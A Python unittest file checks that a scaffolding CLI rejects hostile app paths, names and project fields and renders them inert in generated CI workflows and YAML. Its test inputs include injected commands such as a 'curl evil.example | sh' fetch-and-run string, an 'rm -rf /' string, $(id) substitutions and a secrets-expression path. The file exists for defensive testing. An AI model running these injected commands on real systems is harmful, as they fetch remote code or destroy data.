"""A user value that reaches generated code, configuration or CI is checked at every entry point and inert where it is rendered.

The values are an app's ID, path, name and audience, and the project's name and description. They come from an
answers file, the manifest or a prompt, and they end up in shell steps, YAML, Gradle, Xcode, npm and pyproject files and
Markdown that agents read. These tests prove three things:

1. every entry point refuses a hostile value: the manifest normalizer, `prism new`, `prism app add` and Copier's own validators;
2. the pack workflows render a path and a name as data (a quoted environment variable and serialized YAML), never into a shell step,
   even when the value gets past the validation;
3. the workspace layer's YAML stays valid, with the value as one scalar, for a hostile app list.
"""

from __future__ import annotations

import contextlib
import io
import tempfile
import unittest
from pathlib import Path

import yaml
from jinja2 import Environment, StrictUndefined

from prism_cli import cli
from prism_cli.app_model import normalize_manifest
from prism_cli.packs import PACK_STACKS, pack_answers
from tests import real_temp  # noqa: F401
from tests.layered_support import run_cli, write_answers

REPO_ROOT = Path(__file__).resolve().parents[1]
PINS = yaml.safe_load((REPO_ROOT / "packs" / "versions.yml").read_text(encoding="utf-8"))

HOSTILE_PATH = "apps/$(id)"
HOSTILE_NAMES = (
    'x" ; curl evil.example | sh #',
    "x'; rm -rf / '",
    "x`id`",
    "$(id)",
    "x: # y",
    "x\n- injected: yes",
    "{{ 7 * 7 }}",
)
HOSTILE_PATHS = ("apps/$(id)", "apps/`id`", "apps/a;b", "apps/a b", "apps/a\nb", "apps/${{ secrets.TOKEN }}", "../escape", "/abs", "C:/x", "apps\\x", "Apps/Web")
FRAGMENTS = ("$(id)", "`", "curl", "rm -rf", "injected", "secrets.", "7 * 7")


def hostile_app(stack: str, **overrides: str) -> dict[str, str]:
    app = {"id": "web", "name": "Web", "stack": stack, "repository": "workspace", "path": "web", "audience": "B2C", "generation": "scaffolded"}
    app.update(overrides)
    return app


class EntryPointTests(unittest.TestCase):
    def test_the_manifest_normalizer_refuses_every_hostile_path_name_and_audience(self) -> None:
        for field, values in (("path", HOSTILE_PATHS), ("name", HOSTILE_NAMES), ("audience", HOSTILE_NAMES)):
            for value in values:
                with self.subTest(field=field, value=value):
                    entry = {"id": "web", "stack": "nextjs-web", "path": "apps/web", "name": "Web", "audience": "B2C", field: value}
                    _model, diagnostics = normalize_manifest({"schema_version": 2, "apps": [entry]}, path=Path("prism.workspace.yml"))
                    self.assertTrue([item for item in diagnostics if item.severity == "error"], f"{field} {value!r} was accepted")

    def test_prism_new_refuses_a_hostile_answers_file_before_it_generates_anything(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            base = {"project_name": "Hostile", "apps": [hostile_app("nextjs-web")]}
            cases = {
                "path": {**base, "apps": [hostile_app("nextjs-web", path=HOSTILE_PATH)]},
                "app name": {**base, "apps": [hostile_app("nextjs-web", name=HOSTILE_NAMES[0])]},
                "audience": {**base, "apps": [hostile_app("nextjs-web", audience=HOSTILE_NAMES[1])]},
                "project name": {**base, "project_name": HOSTILE_NAMES[0]},
                "description": {**base, "description": 'say "hi" $(id)'},
            }
            for label, answers in cases.items():
                with self.subTest(label):
                    destination = root / label.replace(" ", "-")
                    path = write_answers(root / f"{label.replace(' ', '-')}.yml", answers)
                    code, _out, err = run_cli("new", "--answers", str(path), "--dest", str(destination), "--yes")
                    self.assertEqual(cli.EXIT_VALIDATION, code, err)
                    self.assertFalse(destination.exists(), "nothing was generated")

    def test_prism_app_add_refuses_hostile_values(self) -> None:
        from prism_cli.app_cli import plan_app_add

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "prism.workspace.yml").write_text(
                yaml.safe_dump({"schema_version": 2, "project": {"name": "P", "slug": "p"}, "apps": []}, sort_keys=False), encoding="utf-8"
            )
            for label, kwargs in {
                "path": {"path": HOSTILE_PATH},
                "name": {"name": HOSTILE_NAMES[1]},
                "audience": {"audience": HOSTILE_NAMES[0]},
            }.items():
                with self.subTest(label):
                    plan = plan_app_add(root, "web", "nextjs-web", scaffold=False, **kwargs)
                    self.assertTrue(plan["conflicts"], f"{label} was accepted")
                    self.assertEqual([], plan["changes"])


class CopierValidatorTests(unittest.TestCase):
    """Copier itself refuses a hostile value, so a raw `copier copy` is as safe as the CLI."""

    def generate(self, apps: list[dict[str, str]], **project: str) -> tuple[int, Path]:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        destination = Path(temporary.name) / "ws"
        answers = {"project_name": "Hostile", "project_slug": "hostile", "package_identifier": "com.example.hostile", "apps": apps, "repositories": [], **project}
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            code = cli.run_copier(str(REPO_ROOT), destination, answers)
        return code, destination

    def test_every_pack_refuses_a_hostile_path_name_and_audience(self) -> None:
        for stack in PACK_STACKS:
            for field, value in (("path", HOSTILE_PATH), ("name", HOSTILE_NAMES[0]), ("audience", HOSTILE_NAMES[1])):
                with self.subTest(stack=stack, field=field):
                    code, destination = self.generate([hostile_app(stack, **{field: value})])
                    self.assertEqual(cli.EXIT_COPIER, code)
                    self.assertFalse((destination / "web").exists(), "the app layer was not generated")
                    self.assertFalse((destination / "apps").exists())

    def test_the_workspace_layer_refuses_a_hostile_project_name_and_description(self) -> None:
        for field, value in (("project_name", HOSTILE_NAMES[0]), ("description", 'a "quote" and $(id)')):
            with self.subTest(field=field):
                code, destination = self.generate([], **{field: value})
                self.assertEqual(cli.EXIT_COPIER, code)
                self.assertFalse((destination / "Taskfile.yml").exists())


def render(path: Path, context: dict) -> str:
    environment = Environment(undefined=StrictUndefined, keep_trailing_newline=True, autoescape=False)
    return environment.from_string(path.read_text(encoding="utf-8")).render(**context)


def workflow_context(stack: str, **hostile: str) -> dict:
    app = hostile_app(stack, **hostile)
    answers = pack_answers({"project_name": "Hostile", "project_slug": "hostile", "package_identifier": "com.example.hostile"}, app, port=3000)
    return {**answers, "versions": PINS[stack]}


class RenderedWorkflowTests(unittest.TestCase):
    """Even a value that gets past the validation is data in a pack workflow: one quoted variable and serialized YAML."""

    def workflow_path(self, stack: str) -> Path:
        return REPO_ROOT / "packs" / stack / ".github" / "workflows" / "{{ app_id }}.yml.jinja"

    def test_a_hostile_path_and_name_never_reach_a_shell_step_and_the_yaml_stays_valid(self) -> None:
        for stack in PACK_STACKS:
            for path, name in ((HOSTILE_PATH, HOSTILE_NAMES[0]), ("apps/a\n- injected: yes", HOSTILE_NAMES[5]), ("apps/`id`", HOSTILE_NAMES[1]), ("apps/$(id)", HOSTILE_NAMES[4])):
                with self.subTest(stack=stack, path=path, name=name):
                    rendered = render(self.workflow_path(stack), workflow_context(stack, path=path, name=name))
                    data = yaml.safe_load(rendered)
                    self.assertEqual(f"{name} CI (web)", data["name"], "the name is one string")
                    self.assertEqual(path, data["env"]["APP_PATH"], "the path is one string, set once, as a variable")
                    self.assertFalse({key for key in data if key not in {"name", "on", True, "env", "permissions", "jobs", "concurrency"}}, "no key was injected")
                    for job in data["jobs"].values():
                        for step in job["steps"]:
                            for text in (step.get("run", ""), step.get("working-directory", ""), *map(str, (step.get("with") or {}).values())):
                                for fragment in (path, *FRAGMENTS):
                                    if fragment in text:
                                        self.fail(f"`{fragment}` reached a step: {text!r}")
                        defaults = (job.get("defaults") or {}).get("run") or {}
                        if defaults:
                            self.assertEqual("${{ env.APP_PATH }}", defaults["working-directory"])
                    # The path appears in the rendered file only as the variable and in the trigger paths.
                    other_lines = [line for line in rendered.splitlines() if "APP_PATH:" not in line and "/**" not in line and ".github/workflows" not in line]
                    self.assertFalse(any(path.splitlines()[0] in line for line in other_lines), other_lines)

    def test_the_workflow_templates_never_put_the_app_path_into_a_run_or_a_working_directory(self) -> None:
        for stack in PACK_STACKS:
            with self.subTest(stack=stack):
                text = self.workflow_path(stack).read_text(encoding="utf-8")
                uses = [line.strip() for line in text.splitlines() if "app_path" in line]
                self.assertEqual(["APP_PATH: {{ app_path | tojson }}"], uses, "the path enters the workflow once, serialized")
                self.assertNotIn("{{ app_path }}", text)
                self.assertNotIn("{{ app_name }}", text)
                self.assertEqual(1, text.count("name: {{ ci_workflow_name | tojson }}"))

    def test_the_workspace_layer_keeps_valid_yaml_for_a_hostile_app_list(self) -> None:
        context = {
            "project_name": HOSTILE_NAMES[4],
            "project_slug": "hostile",
            "package_identifier": "com.example.hostile",
            "description": 'a "quote": # not a comment',
            "stacks": ["spring-backend", "nextjs-web"],
            "pack_versions": PINS,
            "apps": [
                {"id": "backend", "name": HOSTILE_NAMES[0], "stack": "spring-backend", "path": "apps/$(id)", "audience": "", "port": 8080},
                {"id": "web", "name": "Web", "stack": "nextjs-web", "path": "apps/x\n  injected: [yes", "audience": "", "port": 3000},
            ],
        }
        for relative, key in (("Taskfile.yml.jinja", "includes"), ("docker-compose.yml.jinja", "services")):
            with self.subTest(file=relative):
                data = yaml.safe_load(render(REPO_ROOT / "template" / relative, context))
                self.assertIn(key, data)
        taskfile = yaml.safe_load(render(REPO_ROOT / "template" / "Taskfile.yml.jinja", context))
        self.assertEqual(HOSTILE_NAMES[4], taskfile["vars"]["PROJECT_NAME"])
        self.assertEqual("./apps/$(id)/Taskfile.yml", taskfile["includes"]["backend"]["taskfile"])
        compose = yaml.safe_load(render(REPO_ROOT / "template" / "docker-compose.yml.jinja", context))
        self.assertEqual("./apps/$(id)", compose["services"]["backend"]["build"]["context"])
        contract = yaml.safe_load(render(REPO_ROOT / "template" / "shared" / "api-contracts" / "openapi.yml.jinja", context))
        self.assertEqual(f"{HOSTILE_NAMES[4]} API", contract["info"]["title"])
        self.assertEqual('a "quote": # not a comment', contract["info"]["description"])


if __name__ == "__main__":
    unittest.main()
